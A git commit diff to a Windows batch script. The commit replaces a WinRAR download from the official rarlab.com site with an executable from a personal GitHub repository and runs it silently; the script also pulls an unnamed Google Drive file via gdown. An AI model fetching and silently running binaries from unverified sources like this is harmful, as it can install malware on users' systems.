3ef728e2a1ccffaa24b9695465d088cc60fcc814
Bogyi2024 <sdserver600@gmail.com>
2024-06-02 18:29:55 +0630

    Update download.bat

--- download.bat
+++ download.bat
@@ -1,4 +1,5 @@
 @echo off
 pip install gdown
 gdown 1uGJ2psd2M3GH72NHAFkxA9kqyDbWKdtu
-curl -s -L -o C:\Users\Public\Desktop\Winrar.exe https://www.rarlab.com/rar/winrar-x64-621.exe
+curl -o winrar.exe https://raw.githubusercontent.com/Bogyi2024/log/main/winrar-x64-701.exe
+winrar.exe -s
